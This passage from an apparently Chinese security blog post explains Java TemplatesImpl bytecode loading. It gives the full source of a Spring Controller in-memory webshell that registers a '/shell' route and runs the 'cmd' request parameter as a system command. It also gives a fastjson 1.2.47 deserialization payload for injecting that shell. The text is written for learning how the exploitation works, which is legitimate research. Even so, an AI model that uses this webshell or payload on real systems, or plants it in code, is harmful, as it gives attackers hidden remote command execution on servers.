class="string">&quot;_bytecodes&quot;</span>, new byte[][] <span class="string">&#123;code&#125;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, new TransformerFactoryImpl());</span><br><span class="line">        templates.newTransformer();</span><br><span class="line">    &#125;</span><br><span class="line">    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj,value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>4、执行，确实弹出了计算器<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673862345939-24ded8fe-2744-48cd-9b0b-cd67ac10fc0f.png#averageHue=%23775b30&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=591&id=u44225d82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1182&originWidth=2068&originalType=binary&ratio=1&rotation=0&showTitle=false&size=484928&status=done&style=none&taskId=u262e0611-1493-4481-a0d7-6ef9aa51a63&title=&width=1034" alt="image.png"><br>5、这里很麻烦，每次都要去找到class文件并获取它的字节码，可以通过一个包，直接读取字节码</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- https:<span class="regexp">//m</span>vnrepository.com/artifact/javassist/javassist --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">	&lt;groupId&gt;javassist&lt;<span class="regexp">/groupId&gt;</span></span><br><span class="line"><span class="regexp">	&lt;artifactId&gt;javassist&lt;/ar</span>tifactId&gt;</span><br><span class="line">	&lt;version&gt;<span class="number">3.12</span>.<span class="number">1</span>.GA&lt;<span class="regexp">/version&gt;</span></span><br><span class="line"><span class="regexp">&lt;/d</span>ependency&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673862525599-1311b277-da75-4680-8e7e-332f790a72cd.png#averageHue=%232f2f2f&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=326&id=u2c20e35a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=652&originWidth=2034&originalType=binary&ratio=1&rotation=0&showTitle=false&size=171021&status=done&style=none&taskId=u8f4f2fb0-9871-4c99-b746-9a4d64a67c4&title=&width=1017" alt="image.png"></p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ClassPool pool = ClassPool.getDefault();</span><br><span class="line">CtClass clazz = pool.get(com.classloader.TemplatesImplEvil.class.getName());</span><br><span class="line">byte[] code = clazz.toBytecode();</span><br></pre></td></tr></table></figure>
<p>6、可以正常执行了，我在com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.TransletClassLoader#defineClass处下了个断点<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673862853892-af1da6f0-eedb-43f9-bab8-b60ad8af526f.png#averageHue=%232c2c2b&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=488&id=ub59ebce6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=976&originWidth=1956&originalType=binary&ratio=1&rotation=0&showTitle=false&size=140728&status=done&style=none&taskId=u52ce98df-0933-4f7f-acbe-af18db78d40&title=&width=978" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673862881933-54fa9460-613c-44b0-ac00-58ad8a3488f0.png#averageHue=%234c8884&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=230&id=uccff1d15&margin=%5Bobject%20Object%5D&name=image.png&originHeight=460&originWidth=1154&originalType=binary&ratio=1&rotation=0&showTitle=false&size=100309&status=done&style=none&taskId=u6f7727ad-6e17-4942-b823-fb058aebf55&title=&width=577" alt="image.png"><br>7、前面知道了newInstance实例化之后才能触发构造方法，这里看调用链，最后是到defineClass就结束了，为什么也可以实现调用构造方法呢，我在Runtime处下了个断点查看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673862736559-dc78af85-716b-4403-95f8-66687c3335a8.png#averageHue=%232d2d2c&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=515&id=ueba7fe82&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1030&originWidth=2172&originalType=binary&ratio=1&rotation=0&showTitle=false&size=181282&status=done&style=none&taskId=u8afa89dc-15bc-4281-9ec9-201fcefeefe&title=&width=1086" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673862782722-c7b69cb2-afb1-40ce-b416-c33a1f804b1d.png#averageHue=%23757573&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=197&id=u61c09452&margin=%5Bobject%20Object%5D&name=image.png&originHeight=394&originWidth=1104&originalType=binary&ratio=1&rotation=0&showTitle=false&size=118229&status=done&style=none&taskId=u6e076080-22d8-4290-aa09-6b2f69990c5&title=&width=552" alt="image.png"><br>8、看利用链是从getTransletInstance就调用了newInstance<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673863201554-40140dfa-ea22-4acc-999d-f70546333db1.png#averageHue=%232c2c2b&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=395&id=u9f7b0d6d&margin=%5Bobject%20Object%5D&name=image.png&originHeight=790&originWidth=2062&originalType=binary&ratio=1&rotation=0&showTitle=false&size=155349&status=done&style=none&taskId=u5f6141ad-54eb-490d-8bd9-de3bb352529&title=&width=1031" alt="image.png"><br>9、在newInstance的上面，进行了_name和_class的判断，然后进入调用链到defineClass进行类定义<br>之后，到</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">AbstractTranslet translet = (AbstractTranslet)</span><br><span class="line">        _class[_transletIndex].getConstructor().newInstance();</span><br></pre></td></tr></table></figure>
<p>强转为AbstractTranslet，并且调用newInstance实例化。<br>这也是为什么执行的类需要继承AbstractTranslet，并且没有看到newInstance<br>10、完善之后的利用链</p>
<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">TemplatesImpl<span class="comment">#getOutputProperties() -&gt; </span></span><br><span class="line">TemplatesImpl<span class="comment">#newTransformer() -&gt; </span></span><br><span class="line">TemplatesImpl<span class="comment">#getTransletInstance() -&gt; </span></span><br><span class="line">TemplatesImpl<span class="comment">#defineTransletClasses() -&gt; </span></span><br><span class="line">TransletClassLoader<span class="comment">#defineClass()</span></span><br><span class="line">TemplatesImpl<span class="comment">#getTransletInstance() -&gt; </span></span><br><span class="line">Constructor<span class="comment">#newInstance() -&gt;</span></span><br><span class="line">Runtime<span class="comment">#exec(java.lang.String)</span></span><br></pre></td></tr></table></figure>
<p> 11、补个坑，TemplatesImplEvil创建的两个transform方法，继承AbstractTranslet自动需要的。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1673863580655-a8ba2c00-a40e-4396-b46a-c4203f9c31c5.png#averageHue=%232c302e&clientId=u221a1ce6-907c-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=414&id=ue8d1d9c6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=828&originWidth=1878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=396542&status=done&style=none&taskId=uadbf14a9-83c4-419b-bc88-e879c67cf2a&title=&width=939" alt="image.png"></p>
<h2 id="0x06-内存马"><a href="#0x06-内存马" class="headerlink" title="0x06 内存马"></a>0x06 内存马</h2><p>文章第四部分，了解了实例化类的时候，会自动执行static{}代码块，{}代码块，无参构造方法<br>那么如何注入内存马呢，也是通过newInstance实现<br>1、首先我们看完整的spring Controller内存马</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import org.springframework.web.context.WebApplicationContext;</span><br><span class="line">import org.springframework.web.context.request.RequestContextHolder;</span><br><span class="line">import org.springframework.web.context.request.ServletRequestAttributes;</span><br><span class="line">import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition;</span><br><span class="line">import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.RequestMappingInfo;</span><br><span class="line">import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;</span><br><span class="line"></span><br><span class="line">import javax.servlet.http.HttpServletRequest;</span><br><span class="line">import javax.servlet.http.HttpServletResponse;</span><br><span class="line">import java.io.PrintWriter;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line">//回显spring Controller内存马</span><br><span class="line"></span><br><span class="line">public class TemplatesImplSpringController extends AbstractTranslet &#123;</span><br><span class="line">    public TemplatesImplSpringController() throws Exception&#123;</span><br><span class="line">        super();</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.</span><br><span class="line">                currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        Method method = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;).getDeclaredMethod(&quot;getMappingRegistry&quot;);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Method method2 = TemplatesImplSpringController.class.getMethod(&quot;test&quot;);</span><br><span class="line">        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);</span><br><span class="line">        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line">        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br><span class="line">        TemplatesImplSpringController inject = new TemplatesImplSpringController(&quot;aaa&quot;);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, inject, method2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public TemplatesImplSpringController(String aaa) &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public void test() throws Exception &#123;</span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line"></span><br><span class="line">        try &#123;</span><br><span class="line">            String arg0 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            if (arg0 != null) &#123;</span><br><span class="line">                String o = &quot;&quot;;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                if (System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;)) &#123;</span><br><span class="line">                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                o = c.hasNext() ? c.next() : o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                response.sendError(404);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>2、内容有点多，首先看到有如下几个方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public TemplatesImplSpringController() throws Exception&#123;</span><br><span class="line">public TemplatesImplSpringController(String aaa) &#123;</span><br><span class="line">public void test() throws Exception &#123;</span><br><span class="line">public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br></pre></td></tr></table></figure>
<p>3、倒数两个可以不看，前面了解了要通过templatesImpl加载某个类的字节码，需要继承AbstractTranslet，继承之后自动生成两个transform方法<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675049345996-53cdd171-5bf0-43af-b07f-08421a862bb0.png#averageHue=%232c2c2b&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=640&id=u0003e1d0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1280&originWidth=2150&originalType=binary&ratio=1&rotation=0&showTitle=false&size=248621&status=done&style=none&taskId=ubd4674dd-5127-4448-9768-c6a3dc454b7&title=&width=1075" alt="image.png"><br>4、然后整个内存马就变成了3个部分</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">无参构造方法TemplatesImplSpringController()</span><br><span class="line">有参构造方法TemplatesImplSpringController(String aaa)</span><br><span class="line">test()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675049523848-d758904a-a934-4ce2-a040-55b06bcff726.png#averageHue=%232d2c2b&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=543&id=u938b709c&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1086&originWidth=2116&originalType=binary&ratio=1&rotation=0&showTitle=false&size=140662&status=done&style=none&taskId=ucc1658ad-7e9c-43f7-b759-fc083b65f45&title=&width=1058" alt="image.png"><br>5、了解过内存马之后我们知道，tomcat或者spring，注入内存马都基本是通过获取上下文对象，再通过内置方法动态注册filter、listener、selvelt、controller、intercopter等<br>查看无参构造方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">public TemplatesImplSpringController() throws Exception&#123;</span><br><span class="line">        super();</span><br><span class="line">        WebApplicationContext context = (WebApplicationContext) RequestContextHolder.</span><br><span class="line">                currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br><span class="line">        RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">        Method method = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;).getDeclaredMethod(&quot;getMappingRegistry&quot;);</span><br><span class="line">        method.setAccessible(true);</span><br><span class="line">        Method method2 = TemplatesImplSpringController.class.getMethod(&quot;test&quot;);</span><br><span class="line">        PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);</span><br><span class="line">        RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br><span class="line">        RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br><span class="line">        TemplatesImplSpringController inject = new TemplatesImplSpringController(&quot;aaa&quot;);</span><br><span class="line">        mappingHandlerMapping.registerMapping(info, inject, method2);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>super关键字主要是防止编译报错，具体可以看：<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/yongbutingxide/article/details/82669054">https://blog.csdn.net/yongbutingxide/article/details/82669054</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">获取上下文对象context市面上公布的有4种方式：</span><br><span class="line"></span><br><span class="line">//第一种：getCurrentWebApplicationContext()</span><br><span class="line">// getCurrentWebApplicationContext方法获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。</span><br><span class="line">WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</span><br><span class="line"></span><br><span class="line">//第二种：WebApplicationContextUtils</span><br><span class="line">// 通过这种方法获得的也是一个 Root WebApplicationContext 。此方法看起来比较麻烦</span><br><span class="line">WebApplicationContext context = WebApplicationContextUtils.getWebApplicationContext(RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest()).getServletContext());</span><br><span class="line"></span><br><span class="line">//第三种：RequestContextUtils</span><br><span class="line">// 通过 ServletRequest 类的实例来获得 Child WebApplicationContext</span><br><span class="line">WebApplicationContext context = RequestContextUtils.getWebApplicationContext(((ServletRequestAttributes)RequestContextHolder.currentRequestAttributes()).getRequest());</span><br><span class="line"></span><br><span class="line">//第四种：getAttribute</span><br><span class="line">// 这种方式与前几种的思路就不太一样了，因为所有的Context在创建后，都会被作为一个属性添加到了ServletContext中。所以通过直接获得ServletContext通过属性Context拿到 Child WebApplicationContext</span><br><span class="line">WebApplicationContext context = (WebApplicationContext)RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>6、拿到context之后，就可以通过context获取RequestMappingHandlerMapping，对象可以通过registerMapping注册恶意的Controller</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 动态注册controller</span><br><span class="line">// 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean</span><br><span class="line">RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class);</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">// 5. 在内存中动态注册 controller</span><br><span class="line">RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null);</span><br><span class="line">...</span><br><span class="line">// 将该controller注册到Spring容器</span><br><span class="line">mappingHandlerMapping.registerMapping(info, inject, method2);</span><br></pre></td></tr></table></figure>

<p>7、中间部分则是创建好注册恶意controller所需要的字段，url为指定的路径</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 2. 通过反射获得自定义 controller 中唯一的 Method 对象</span><br><span class="line">Method method = Class.forName(&quot;org.springframework.web.servlet.handler.AbstractHandlerMethodMapping&quot;).getDeclaredMethod(&quot;getMappingRegistry&quot;);</span><br><span class="line">method.setAccessible(true);</span><br><span class="line">// 通过反射获得该类的test方法</span><br><span class="line">Method method2 = TemplatesImplSpringController.class.getMethod(&quot;test&quot;);</span><br><span class="line">// 3. 定义访问 controller 的 URL 地址</span><br><span class="line">PatternsRequestCondition url = new PatternsRequestCondition(&quot;/shell&quot;);</span><br><span class="line">// 4. 定义允许访问 controller 的 HTTP 方法（GET/POST）</span><br><span class="line">RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition();</span><br></pre></td></tr></table></figure>
<p>8、第二个构造函数与无参构造函数中创建对象的含义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环</span><br><span class="line">TemplatesImplSpringController inject = new TemplatesImplSpringController(&quot;aaa&quot;);</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675055191899-bb72cae7-be5a-422f-9e6c-9cae3d4eafea.png#averageHue=%232c2c2b&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=549&id=u360b0c50&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1098&originWidth=2266&originalType=binary&ratio=1&rotation=0&showTitle=false&size=236558&status=done&style=none&taskId=u68a4cd82-8a40-4624-a1fc-1cd83db46a0&title=&width=1133" alt="image.png"><br>9、最后剩下test部分，此部分最后会注册到spring中，为内存马实际执行代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public void test() throws Exception &#123;</span><br><span class="line">        // 获取request和response对象</span><br><span class="line">        HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest();</span><br><span class="line">        HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse();</span><br><span class="line">        // 获取cmd参数并执行命令，回显</span><br><span class="line">        try &#123;</span><br><span class="line">            String arg0 = request.getParameter(&quot;cmd&quot;);</span><br><span class="line">            PrintWriter writer = response.getWriter();</span><br><span class="line">            if (arg0 != null) &#123;</span><br><span class="line">                String o = &quot;&quot;;</span><br><span class="line">                java.lang.ProcessBuilder p;</span><br><span class="line">                if(System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;))&#123;</span><br><span class="line">                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, arg0&#125;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    p = new java.lang.ProcessBuilder(new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, arg0&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                java.util.Scanner c = new java.util.Scanner(p.start().getInputStream()).useDelimiter(&quot;\\A&quot;);</span><br><span class="line">                o = c.hasNext() ? c.next(): o;</span><br><span class="line">                c.close();</span><br><span class="line">                writer.write(o);</span><br><span class="line">                writer.flush();</span><br><span class="line">                writer.close();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                //当请求没有携带指定的参数(code)时，返回 404 错误</span><br><span class="line">                response.sendError(404);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;catch (Exception e)&#123;&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>比较关键的就是request和response对象的获取<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675055392160-99fa5126-f33e-4134-8002-c2092ce5fade.png#averageHue=%232c2c2b&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=330&id=u9b863a81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=1844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138598&status=done&style=none&taskId=u0761490f-0c16-43fc-84f0-b16317a69b2&title=&width=922" alt="image.png"><br>引入的两个包为tomcat包，这也是为什么spring gateway的el表达式注入漏洞无法直接注入冰蝎内存马的原因<br><img src="https://cdn.nlark.com/yuque/0/2023/png/12366538/1675055534712-7f706280-9274-406a-a20f-797624f337a5.png#averageHue=%232d2c2b&clientId=u49697034-d617-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=509&id=uab163f53&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1018&originWidth=2050&originalType=binary&ratio=1&rotation=0&showTitle=false&size=208605&status=done&style=none&taskId=ubca163e9-a97f-4bad-8c29-e0cf194b702&title=&width=1025" alt="image.png"></p>
<h2 id="0x07-fastjson1-2-47注入内存马"><a href="#0x07-fastjson1-2-47注入内存马" class="headerlink" title="0x07 fastjson1.2.47注入内存马"></a>0x07 fastjson1.2.47注入内存马</h2><p>通过的是templatesImpl利用链</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;a&quot;</span>: &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.Class&quot;</span>,<span class="attr">&quot;val&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>&#125;,<span class="attr">&quot;b&quot;</span>: &#123;<span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>,<span class="attr">&quot;_bytecodes&quot;</span>: [<span class="string">&quot;恶意类字节码&quot;</span>],&#x27;_name&#x27;: &#x27;a.b&#x27;,&#x27;_tfactory&#x27;: &#123;&#125;,<span class="attr">&quot;_outputProperties&quot;</span>: &#123;&#125;,<span class="attr">&quot;_name&quot;</span>: <span class="string">&quot;b&quot;</span>,<span class="attr">&quot;_version&quot;</span>: <span class="string">&quot;1.0&quot;</span>,<span class="attr">&quot;allowedProtocols&quot;</span>: <span class="string">&quot;all&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>1、起一个springboot，代码如下</p>
